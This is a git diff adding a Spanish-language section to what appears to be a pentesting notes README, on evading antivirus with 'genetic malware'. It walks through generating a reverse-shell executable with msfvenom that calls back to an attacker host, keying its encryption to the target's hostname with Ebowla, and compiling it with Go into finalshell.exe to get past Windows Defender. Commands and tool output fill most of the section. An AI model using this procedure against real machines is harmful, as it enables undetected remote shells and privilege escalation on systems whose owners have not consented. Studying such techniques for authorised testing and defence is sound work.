@@ -39,6 +39,7 @@
      * [Pentesting Linux](#pentesting-linux)
      * [Pentesting Windows](#pentesting-windows)
         * [Transferencia de Archivos](#transferencia-de-archivos)
+        * [AV Evasion Genetic Malware](#av-evasion-genetic-malware
           
 Antecedentes
 ===============================================================================================================================
@@ -1297,4 +1298,121 @@ Posteriormente, nos traemos al equipo los recursos que consideremos:
 
 ```bash
 move mimikatz.exe C:\Users\s4vitar\Desktop\mimikatz.exe
+```
+
+#### AV Evasion Genetic Malware
+
+A continuación, se detalla el procedimiento para crear **Malware Genético**, ideal y de utilidad para la evasión de antivirus así como del propio Windows Defender.
+
+Para ello, necesitamos descargar en local el recurso [Ebowla](https://github.com/Genetic-Malware/Ebowla), así como tener instalado **GO** para la forma en la que compilaremos nuestro Malware.
+
+Cuando todo esté preparado, una vez comprometida la máquina Windows, suponiendo para un caso práctico que tenemos que subir un archivo **.exe** para haciendo uso de **RottenPotato** poder escalar privilegios pasando como argumento dicho binario (el cual será ejecutado con privilegios de administrador), donde el Windows Defender nos detiene la ejecución del binario, lo primero será crear nuestro Malware desde **msfvenom**:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -f exe -o shell.exe
+```
+
+Una vez creado, a modo de ejemplo jugando con una simple variable de entorno, aplicamos el siguiente comando en la máquina Windows:
+
+```bash
+C:\Users\s4vitar\Desktop\ hostname
+PC-S4vitar
+```
+
+Ya conociendo el **hostname**, llevamos a cabo antes que nada un par de configuraciones a nivel de archivos sobre los recursos que trae **ebowla**. Abrimos en primer lugar el archivo _genetic.config_, cambiando las variables **output_type** y **payload_type** por las siguientes:
+
+```bash
+output_type = GO
+payload_type = EXE
+```
+
+Una vez hecho, bajamos hasta la sección de variables de entorno:
+
+```bash
+    [[ENV_VAR]]
+
+        username = ''
+        computername = ''
+        homepath = ''
+        homedrive = ''
+        Number_of_processors = ''
+        processor_identifier = ''
+        processor_revision = ''
+        userdomain = ''
+        systemdrive = ''
+        userprofile = ''
+        path = ''
+        temp = ''
+
+
+     [[PATH]]
+
+```
+
+En este caso, dado que a modo de ejemplo vamos a jugar únicamente con la variable **hostname**, introducimos su valor en la variable correspondiente:
+
+
+```bash
+    [[ENV_VAR]]
+
+        username = ''
+        computername = 'PC-S4vitar'
+        homepath = ''
+        homedrive = ''
+        Number_of_processors = ''
+        processor_identifier = ''
+        processor_revision = ''
+        userdomain = ''
+        systemdrive = ''
+        userprofile = ''
+        path = ''
+        temp = ''
+
+
+     [[PATH]]
+
+```
+
+**IMPORTANTE:** Es de vital importancia no confundirse en este punto, pues cabe decir que el cifrado se hace a través de las propias variables de entorno. Esto quiere decir, que tras la ejecución del binario en la máquina comprometido, esta se encargará de descifrar todo el ejecutable a través de las propias variables de entorno del sistema, lo que significa que en caso de haberlas introducido mal... la ejecución del binario no será funcional.
+
+Una vez hecho, aplicamos el siguiente comando desde consola:
+
+```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
+└──╼ #python ebowla.py shell.exe genetic.config 
+[*] Using Symmetric encryption
+[*] Payload length 73802
+[*] Payload_type exe
+[*] Using EXE payload template
+[*] Used environment variables:
+	[-] environment value used: computername, value used: pc-s4vitar
+[!] Path string not used as pasrt of key
+[!] External IP mask NOT used as part of key
+[!] System time mask NOT used as part of key
+[*] String used to source the encryption key: pc-s4vitar
+[*] Applying 10000 sha512 hash iterations before encryption
+[*] Encryption key: 026a42181e07e73b5c926bc8fa30017b05e7e276c18fc29ab3e62e6b8e8436f9
+[*] Writing GO payload to: go_symmetric_shell.exe.go
+```
+
+Este paso, lo que hará será crearnos un archivo **go_symmetric_shell.exe.go** en el directorio **output**. Una vez creado, aplicamos el siguiente comando para compilar el binario final:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
+└──╼ #./build_x64_go.sh output/go_symmetric_shell.exe.go finalshell.exe
+[*] Copy Files to tmp for building
+[*] Building...
+[*] Building complete
+[*] Copy finalshell.exe to output
+[*] Cleaning up
+[*] Done
+
+```
+
+Obteniendo un ejecutable final **finalshell.exe**, el cual podemos transferir posteriormente a la máquina Windows.
+
+Es importante que la ruta del binario **go** esté configurada en el _PATH_, pues en caso contrario no lo encontrará. Si queremos que funcione de manera temporal para la ejecución del **ebowla**, simplemente hacemos un EXPORT de nuestro PATH:
+
+```bash
+export PATH=/usr/local/go/bin:$PATH
 ```
